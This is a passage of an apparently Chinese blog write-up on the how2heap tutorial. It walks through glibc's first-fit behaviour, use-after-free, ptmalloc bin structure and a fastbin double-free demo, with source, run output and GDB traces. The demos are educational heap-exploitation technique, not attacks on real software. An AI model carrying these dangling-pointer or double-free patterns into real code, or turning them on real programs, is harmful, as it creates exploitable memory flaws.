demonstrate an attack, but shows the nature of glibc's allocator.\n"</span>);</span><br><span class="line">    <span class="comment">//这个程序并不展示如何攻击,而是展示glibc的一种分配规则.</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"glibc uses a first-fit algorithm to select a free chunk.\n"</span>);</span><br><span class="line">    <span class="comment">//glibc使用一种first-fit算法去选择一个free-chunk.</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If a chunk is free and large enough, malloc will select this chunk.\n"</span>);</span><br><span class="line">    <span class="comment">//如果存在一个free-chunk并且足够大的话,malloc会优先选取这个chunk.</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This can be exploited in a use-after-free situation.\n"</span>);</span><br><span class="line">	<span class="comment">//这种机制就可以在被利用于use after free的情形中.</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 2 buffers. They can be large, don't have to be fastbin.\n"</span>);</span><br><span class="line">    <span class="comment">//先分配两个buffer,可以分配大一点,是不是fastbin也无所谓.</span></span><br><span class="line">	<span class="keyword">char</span>* a = <span class="built_in">malloc</span>(<span class="number">512</span>);</span><br><span class="line">	<span class="keyword">char</span>* b = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">	<span class="keyword">char</span>* c;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(512): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(256): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"we could continue mallocing here...\n"</span>);</span><br><span class="line">    <span class="comment">//我们也可以继续分配…</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"now let's put a string at a that we can read later \"this is A!\"\n"</span>);</span><br><span class="line">    <span class="comment">//为了方便展示如何利用这个机制,我们在这里放置一个字符串 “this is A!”</span></span><br><span class="line">	<span class="built_in">strcpy</span>(a, <span class="string">"this is A!"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"first allocation %p points to %s\n"</span>, a, a);</span><br><span class="line">    <span class="comment">//我们使第一个分配的内存空间的地址指向这个字符串”this is A!”.</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">    <span class="comment">//然后free掉这块内存…</span></span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We don't need to free anything again. As long as we allocate less than 512, it will end up at %p\n"</span>, a);</span><br><span class="line">	<span class="comment">//我们也不需要free其他内存块了.之后只要我们用malloc申请的内存大小小于第一块的512字节,都会给我们返回第一个内存块开始的地址</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, let's allocate 500 bytes\n"</span>);</span><br><span class="line">    <span class="comment">//ok,我们现在开始用malloc申请500个字节试试.</span></span><br><span class="line">	c = <span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(500): %p\n"</span>, c);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And put a different string here, \"this is C!\"\n"</span>);</span><br><span class="line">    <span class="comment">//然后我们在这个地方放置一个不同的字符串 “this is C!”</span></span><br><span class="line">	<span class="built_in">strcpy</span>(c, <span class="string">"this is C!"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd allocation %p points to %s\n"</span>, c, c);</span><br><span class="line">    <span class="comment">//第三个返回的内存块的地址 0x662420 指向了这个字符串 “this is C!”.</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"first allocation %p points to %s\n"</span>, a, a);</span><br><span class="line">    <span class="comment">//第一个返回的内存块的地址也指向这个字符串!</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we reuse the first allocation, it now holds the data from the third allocation.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">	<span class="comment">//如果我们重新使用了第一次分配的内存空间，现在里面存储的是第三次分配的数据</span></span><br></pre></td></tr></table></figure>

<p>这个程序的意思就是我们在申请了第一次内存地址后，Free掉再申请一次的话，得到了之前分配得到的内存地址，运行效果</p>
<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Downloads/tmp$ ./a.out</span><br><span class="line">    </span><br><span class="line">This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.</span><br><span class="line">    </span><br><span class="line">glibc uses a first-fit algorithm to select a <span class="built_in">free</span> chunk.</span><br><span class="line">    </span><br><span class="line">If a chunk is <span class="built_in">free</span> <span class="keyword">and</span> large enough, <span class="built_in">malloc</span> will select <span class="keyword">this</span> chunk.</span><br><span class="line">    </span><br><span class="line">This can be exploited in a use-after-<span class="built_in">free</span> situation.</span><br><span class="line">    </span><br><span class="line">Allocating <span class="number">2</span> buffers. They can be large, don't have to be fastbin.</span><br><span class="line">    </span><br><span class="line">1st malloc(512): 0x85bf008</span><br><span class="line">    </span><br><span class="line">2nd malloc(256): 0x85bf210</span><br><span class="line">    </span><br><span class="line">we could <span class="keyword">continue</span> mallocing here...</span><br><span class="line">    </span><br><span class="line">now let's put a <span class="built_in">string</span> at a that we can read later <span class="string">"this is A!"</span></span><br><span class="line">    </span><br><span class="line">first allocation <span class="number">0x85bf008</span> points to <span class="keyword">this</span> is A!</span><br><span class="line">    </span><br><span class="line">Freeing the first one...</span><br><span class="line">    </span><br><span class="line">We don't need to <span class="built_in">free</span> anything again. As <span class="keyword">long</span> as we allocate less than <span class="number">512</span>, it will end up at <span class="number">0x85bf008</span></span><br><span class="line">    </span><br><span class="line">So, let's allocate <span class="number">500</span> bytes</span><br><span class="line">    </span><br><span class="line">3rd malloc(500): 0x85bf008</span><br><span class="line">    </span><br><span class="line">And put a different <span class="built_in">string</span> here, <span class="string">"this is C!"</span></span><br><span class="line">    </span><br><span class="line"><span class="number">3</span>rd allocation <span class="number">0x85bf008</span> points to <span class="keyword">this</span> is C!</span><br><span class="line">    </span><br><span class="line">first allocation <span class="number">0x85bf008</span> points to <span class="keyword">this</span> is C!</span><br><span class="line">    </span><br><span class="line">If we reuse the first allocation, it now holds the data from the third allocation.</span><br></pre></td></tr></table></figure>

<p>从这里</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1st malloc(512): 0x85bf008</span><br><span class="line">3rd malloc(500): 0x85bf008</span><br></pre></td></tr></table></figure>

<p>我们可以发现两个指针指向了同一个地址</p>
<p>然后我们在GDB里面逐步分析，第一次malloc</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">0x804854c</span> &lt;main+<span class="number">129</span>&gt;       add    esp, <span class="number">0x10</span></span><br><span class="line">   <span class="number">0x804854f</span> &lt;main+<span class="number">132</span>&gt;       sub    esp, <span class="number">0xc</span></span><br><span class="line">   <span class="number">0x8048552</span> &lt;main+<span class="number">135</span>&gt;       push   <span class="number">0x200</span></span><br><span class="line">→  <span class="number">0x8048557</span> &lt;main+<span class="number">140</span>&gt;       call   <span class="number">0x8048390</span> &lt;<span class="built_in">malloc</span>@plt&gt;</span><br><span class="line">  ↳   <span class="number">0x8048390</span> &lt;<span class="built_in">malloc</span>@plt+<span class="number">0</span>&gt;   jmp    DWORD PTR ds:<span class="number">0x804a014</span></span><br><span class="line">      <span class="number">0x8048396</span> &lt;<span class="built_in">malloc</span>@plt+<span class="number">6</span>&gt;   push   <span class="number">0x10</span></span><br><span class="line">      <span class="number">0x804839b</span> &lt;<span class="built_in">malloc</span>@plt+<span class="number">11</span>&gt;  jmp    <span class="number">0x8048360</span></span><br><span class="line">      <span class="number">0x80483a0</span> &lt;__libc_start_main@plt+<span class="number">0</span>&gt; jmp    DWORD PTR ds:<span class="number">0x804a018</span></span><br><span class="line">      <span class="number">0x80483a6</span> &lt;__libc_start_main@plt+<span class="number">6</span>&gt; push   <span class="number">0x18</span></span><br><span class="line">      <span class="number">0x80483ab</span> &lt;__libc_start_main@plt+<span class="number">11</span>&gt; jmp    <span class="number">0x8048360</span></span><br></pre></td></tr></table></figure>

<p>返回的Chunk地址就在EAX寄存器里面</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$eax   : <span class="number">0x0804b008</span>  →  <span class="number">0x00000000</span></span><br><span class="line">$ebx   : <span class="number">0x0</span>       </span><br><span class="line">$ecx   : <span class="number">0xf7fb2780</span>  →  <span class="number">0x00000000</span></span><br><span class="line">$edx   : <span class="number">0x0804b008</span>  →  <span class="number">0x00000000</span></span><br><span class="line">$esp   : <span class="number">0xffffd040</span>  →  <span class="number">0x00000200</span></span><br><span class="line">$ebp   : <span class="number">0xffffd068</span>  →  <span class="number">0x00000000</span></span><br><span class="line">$esi   : <span class="number">0xf7fb2000</span>  →  <span class="number">0x001b1db0</span></span><br><span class="line">$edi   : <span class="number">0xf7fb2000</span>  →  <span class="number">0x001b1db0</span></span><br><span class="line">$eip   : <span class="number">0x0804855c</span>  →  &lt;main+<span class="number">145</span>&gt; add esp, <span class="number">0x10</span></span><br><span class="line">$eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: <span class="number">0x0023</span> $ss: <span class="number">0x002b</span> $ds: <span class="number">0x002b</span> $es: <span class="number">0x002b</span> $fs: <span class="number">0x0000</span> $gs: <span class="number">0x0063</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap chunk <span class="number">0x0804b008</span></span><br><span class="line">Chunk(addr=<span class="number">0x804b008</span>, size=<span class="number">0x208</span>, flags=PREV_INUSE)</span><br><span class="line">Chunk size: <span class="number">520</span> (<span class="number">0x208</span>)</span><br><span class="line">Usable size: <span class="number">516</span> (<span class="number">0x204</span>)</span><br><span class="line">Previous chunk size: <span class="number">0</span> (<span class="number">0x0</span>)</span><br><span class="line">PREV_INUSE flag: On</span><br><span class="line">IS_MMAPPED flag: Off</span><br><span class="line">NON_MAIN_ARENA flag: Off</span><br></pre></td></tr></table></figure>

<p>下一次malloc地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">→   <span class="number">14</span>	 	<span class="keyword">char</span>* b = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">    <span class="number">15</span>	 	<span class="keyword">char</span>* c;</span><br><span class="line">    <span class="number">16</span>	 </span><br><span class="line">    <span class="number">17</span>	 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(512): %p\n"</span>, a);</span><br><span class="line">    <span class="number">18</span>	 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(256): %p\n"</span>, b);</span><br><span class="line">    <span class="number">19</span>	 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"we could continue mallocing here...\n"</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffd040</span>│+<span class="number">0x0000</span>: <span class="number">0x0804b008</span>  →  <span class="string">"this is A!"</span>	 ← $esp</span><br><span class="line"><span class="number">0xffffd044</span>│+<span class="number">0x0004</span>: <span class="number">0x00000001</span></span><br><span class="line"><span class="number">0xffffd048</span>│+<span class="number">0x0008</span>: <span class="number">0x00000019</span></span><br><span class="line"><span class="number">0xffffd04c</span>│+<span class="number">0x000c</span>: <span class="number">0xf7fb2cc0</span>  →  <span class="number">0xfbad2887</span></span><br><span class="line"><span class="number">0xffffd050</span>│+<span class="number">0x0010</span>: <span class="number">0x00000001</span></span><br><span class="line"><span class="number">0xffffd054</span>│+<span class="number">0x0014</span>: <span class="number">0x0804b008</span>  →  <span class="string">"this is A!"</span></span><br><span class="line"><span class="number">0xffffd058</span>│+<span class="number">0x0018</span>: <span class="number">0x0804b210</span>  →  <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0xffffd05c</span>│+<span class="number">0x001c</span>: <span class="number">0x08048731</span>  →  &lt;__libc_csu_init+<span class="number">33</span>&gt; lea eax, [ebx<span class="number">-0xf8</span>]</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap chunk <span class="number">0x0804b008</span></span><br><span class="line">Chunk(addr=<span class="number">0x804b008</span>, size=<span class="number">0x208</span>, flags=PREV_INUSE)</span><br><span class="line">Chunk size: <span class="number">520</span> (<span class="number">0x208</span>)</span><br><span class="line">Usable size: <span class="number">516</span> (<span class="number">0x204</span>)</span><br><span class="line">Previous chunk size: <span class="number">0</span> (<span class="number">0x0</span>)</span><br><span class="line">PREV_INUSE flag: On</span><br><span class="line">IS_MMAPPED flag: Off</span><br><span class="line">NON_MAIN_ARENA flag: Off</span><br></pre></td></tr></table></figure>

<p>第三次malloc</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap chunk <span class="number">0x0804b008</span></span><br><span class="line">Chunk(addr=<span class="number">0x804b008</span>, size=<span class="number">0x1f8</span>, flags=PREV_INUSE)</span><br><span class="line">Chunk size: <span class="number">504</span> (<span class="number">0x1f8</span>)</span><br><span class="line">Usable size: <span class="number">500</span> (<span class="number">0x1f4</span>)</span><br><span class="line">Previous chunk size: <span class="number">0</span> (<span class="number">0x0</span>)</span><br><span class="line">PREV_INUSE flag: On</span><br><span class="line">IS_MMAPPED flag: Off</span><br><span class="line">NON_MAIN_ARENA flag: Off</span><br></pre></td></tr></table></figure>

<p>简单的说，<strong>Use After Free</strong> 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况</p>
<ul>
<li>内存块被释放后，其对应的指针被设置为 <strong>NULL</strong> ， 然后再次使用，自然程序会崩溃。</li>
<li>内存块被释放后，其对应的指针没有被设置为 <strong>NULL</strong> ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li>
<li>内存块被释放后，其对应的指针没有被设置为 <strong>NULL</strong>，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li>
</ul>
<p>而我们一般所指的 <strong>Use After Free</strong> 漏洞主要是后两种。此外，<strong>我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer（ 悬空指针 ）</strong></p>
<p><strong>野指针(wild pointer)</strong>就是没有被初始化过的指针， 悬空指针是指针最初指向的内存已经被释放了的一种指针</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/CTF%E2%80%94%E2%80%94WriteUP/how2heap/1094457-20170227195731329-810447033.png" alt></p>
<p>无论是野指针还是悬空指针，都是<strong>指向无效内存区域(这里的无效指的是”不安全不可控”)的指针</strong>。 访问”不安全可控”(<strong>invalid</strong>)的内存区域将导致”<strong>Undefined Behavior</strong>“</p>
<p>在程序的执行过程中，我们称由 <strong>malloc</strong> 申请的内存为 <strong>chunk</strong> 。这块内存在 <strong>ptmalloc</strong> 内部用 <strong>malloc_chunk</strong> 结构体来表示。当程序申请的 <strong>chunk</strong> 被 <strong>free</strong> 后，会被加入到相应的空闲管理列表中。</p>
<p>非常有意思的是，<strong>无论一个 chunk 的大小如何，处于分配状态还是释放状态，它们都使用一个统一的结构</strong>。虽然它们使用了同一个数据结构，但是根据是否被释放，它们的表现形式会有所不同。</p>
<p>用户 free 掉的内存并不是都会马上归还给系统，<strong>ptmalloc 会统一管理 heap 和 mmap 映射区中空闲的 chunk</strong>，当用户进行下一次分配请求时，ptmalloc 会在空闲的 chunk 中选择一个合适的分配给他，这样就避免了频繁地系统调用</p>
<p><strong>ptmalloc</strong> 把大小相似的 <strong>chunk</strong>，用双向链表连接起来，这样就形成了一个 <strong>bin</strong>。<strong>ptmalloc</strong> 一共维护了 128 个这样的 <strong>bin</strong>，并使用数组来存储这些 bin 如下：</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/CTF%E2%80%94%E2%80%94WriteUP/how2heap/15548795-49ecc4bc156e439a.png" alt></p>
<h3 id="Fast-Bin"><a href="#Fast-Bin" class="headerlink" title="Fast Bin"></a>Fast Bin</h3><p> 默认情况下（<strong>32 位系统为例</strong>）， <strong>fastbin</strong> 中默认支持最大的 <strong>chunk</strong> 的数据空间大小为 64  字节。但是其可以支持的 chunk 的数据空间最大为 80 字节。除此之外， <strong>fastbin</strong> 最多可以支持的 <strong>bin</strong> 的个数为 10  个，从数据空间为 8 字节开始一直到 80 字节（注意这里说的是数据空间大小，也即除去 <strong>prev_size</strong> 和 <strong>size</strong>  字段部分的大小）定义如下 </p>
<p>用户很有可能请求小的内存，而且释放之后也很可能再次请求小内存。所以合并释放小内存，并不明智。在 <strong>fast</strong> <strong>bins</strong> 中，不大于 <strong>max_fast</strong> （默认值为 64B）的 <strong>chunk</strong> 被释放后，首先会被放到 <strong>fast bins</strong> 中，<strong>fast bins</strong> 中的 <strong>chunk</strong> 并不改变它的使用标志 <strong>P</strong>。这样也就无法将它们合并，当需要给用户分配的 <strong>chunk</strong> 小于或等于 <strong>max_fast</strong> 时，<strong>ptmalloc</strong> 首先会在 <strong>fast bins</strong> 中查找相应的空闲块，如果找不到，才会去 <strong>bins</strong>（那个数组）中查找数据块。</p>
<p>在某个特定的时刻，<strong>ptmalloc 会遍历整个 fast bins 将相邻的空闲 chunk 进行合并，并将合并后的 chunk 加入 unsorted bin 中，再加入到其他的 bin 中</strong></p>
<h3 id="Unsorted-Bin"><a href="#Unsorted-Bin" class="headerlink" title="Unsorted Bin"></a>Unsorted Bin</h3><p>如果被用户释放的 <strong>chunk</strong> 或在 <strong>fast bins</strong> 中合并的 <strong>chunk</strong> 大于 <strong>max_fast</strong>，则 <strong>ptmalloc</strong> 会把这些 <strong>chunk</strong> 放入 <strong>unsorted bin</strong> 中。在查找合适的 <strong>chunk</strong> 的时候，首先在 <strong>unsorted bin</strong> 中查找合适的空闲 <strong>chunk</strong>，然后才查找 <strong>bins</strong>。</p>
<p><strong>如果 unsorted bin 中没有合适的 chunk，</strong>则会把 <strong>unsorted bin</strong> 中的 <strong>chunk</strong> 加入到 <strong>bins</strong> 的其他 <strong>bin</strong> 中，再进行查找</p>
<h3 id="Small-Bin"><a href="#Small-Bin" class="headerlink" title="Small Bin"></a>Small Bin</h3><p>数组中的第一个<strong>bin</strong>是 <strong>unsorted bin</strong>，数组中从第 2 个到第 64 个 <strong>bin</strong> 是 <strong>small bin</strong>,它的 <strong>chunk size</strong> 依次递增 <strong>8bytes</strong>，每个<strong>small bin</strong>中的<strong>chunk</strong>大小相同。 <strong>small bins</strong> 中每个 <strong>chunk</strong> 的大小与其所在的 <strong>bin</strong> 的 <strong>index</strong> 的关系为：<strong>chunk_size = 2 * SIZE_SZ *index</strong>，具体如下 </p>
<table>
<thead>
<tr>
<th>下标</th>
<th>SIZE_SZ=4（32 位）</th>
<th>SIZE_SZ=8（64 位）</th>
</tr>
</thead>
<tbody><tr>
<td>2</td>
<td>16</td>
<td>32</td>
</tr>
<tr>
<td>3</td>
<td>24</td>
<td>48</td>
</tr>
<tr>
<td>4</td>
<td>32</td>
<td>64</td>
</tr>
<tr>
<td>5</td>
<td>40</td>
<td>80</td>
</tr>
<tr>
<td>x</td>
<td>2<em>4</em>x</td>
<td>2<em>8</em>x</td>
</tr>
<tr>
<td>63</td>
<td>504</td>
<td>1008</td>
</tr>
</tbody></table>
<p><strong>small bin</strong> 是一个双向链表。双向链表不是循环链表，它是有顺序的。<strong>在相同大小 chunk 的 bin 中 的排序是按照「最近使用」的顺序，也就是说，排在后面的最容易被选中，刚被释放的放在前面</strong></p>
<h3 id="Large-Bin"><a href="#Large-Bin" class="headerlink" title="Large Bin"></a>Large Bin</h3><p><strong>small bin</strong> 后面是 <strong>large bin</strong>，<strong>largin bin</strong>中 <strong>chunk</strong> 的大小不是固定的，而是有一个范围。其中的顺序是按大小排序的，越大的放在越下面，如果大小相同，<strong>按照「最近使用」的顺序</strong>， <strong>large bins</strong> 中一共包括 63 个 <strong>bin</strong>，每个 <strong>bin</strong> 中的 <strong>chunk</strong> 的大小不一致，而是处于一定区间范围内。此外，这 63 个 <strong>bin</strong> 被分成了 6 组，每组 <strong>bin</strong> 中的 <strong>chunk</strong> 大小之间的公差一致，具体如下： </p>
<table>
<thead>
<tr>
<th>组</th>
<th>数量</th>
<th>公差</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>32</td>
<td>64B</td>
</tr>
<tr>
<td>2</td>
<td>16</td>
<td>512B</td>
</tr>
<tr>
<td>3</td>
<td>8</td>
<td>4096B</td>
</tr>
<tr>
<td>4</td>
<td>4</td>
<td>32768B</td>
</tr>
<tr>
<td>5</td>
<td>2</td>
<td>262144B</td>
</tr>
<tr>
<td>6</td>
<td>1</td>
<td>不限制</td>
</tr>
</tbody></table>
<p>当空闲的 <strong>chunk</strong> 被连接到 <strong>bin</strong> 的时候，<strong>ptmalloc</strong> 会把表示该 <strong>chunk</strong> 是否正在使用的标志 <strong>p</strong> 设置为 0。（<strong>注意！这个标志实际处在下一个 chunk 中</strong>）。同时，<strong>ptmalloc</strong> 还会检查它前后（物理前后）的 <strong>chunk</strong> 是否为空，如果为空，<strong>ptmalloc</strong> 会把这些 <strong>chunk</strong> 合并成一个大的 <strong>chunk</strong>，然后把合并后的 <strong>chunk</strong> 放入 <strong>unsorted bin</strong> 中。但是对于较小的 <strong>chunk</strong>，<strong>ptmalloc</strong> 会把它放入 <strong>fast bins</strong> 中。</p>
<p>这个示例中，在64位系统中，分配的内存大小应该都属于<strong>Small Bin</strong>，我们第一次<strong>Free</strong>，<strong>chunk</strong>到了<strong>bin</strong>中的<strong>Small Bin</strong>，然后我们再次分配内存的时候，就会再次得到第一次分配的内存</p>
<h1 id="0x02-fastbin-dup"><a href="#0x02-fastbin-dup" class="headerlink" title="0x02 fastbin_dup"></a>0x02 fastbin_dup</h1><p>源代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> &lt;stdlib.h</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates a simple double-free attack with fastbins.\n"</span>);</span><br><span class="line">	<span class="comment">//这个程序展示了一个利用fastbin进行的简单double-free攻击.</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">    <span class="comment">//先分配三块内存.</span></span><br><span class="line">	<span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">    <span class="comment">//free掉第一块内存…</span></span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line">    <span class="comment">//如果我们再free第一块内存a的话,程序就会崩溃,然后报错.因为这个时候这块内存刚好在对应free-list的顶部,再次free这块内存的时候就会被检查到.</span></span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line">    <span class="comment">//所以我们另外free一个,我们free第二块内存b.</span></span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line">    <span class="comment">//现在我们再次free第一块内存,程序不会崩溃，因为它已经不在链表顶部了.</span></span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n"</span>, a, b, a, a);</span><br><span class="line">    <span class="comment">//现在我们的free-list有这三块内存[a,b,a].</span></span><br><span class="line">    <span class="comment">//如果我们malloc三次的话,我们就会得到a两次!</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行效果</p>
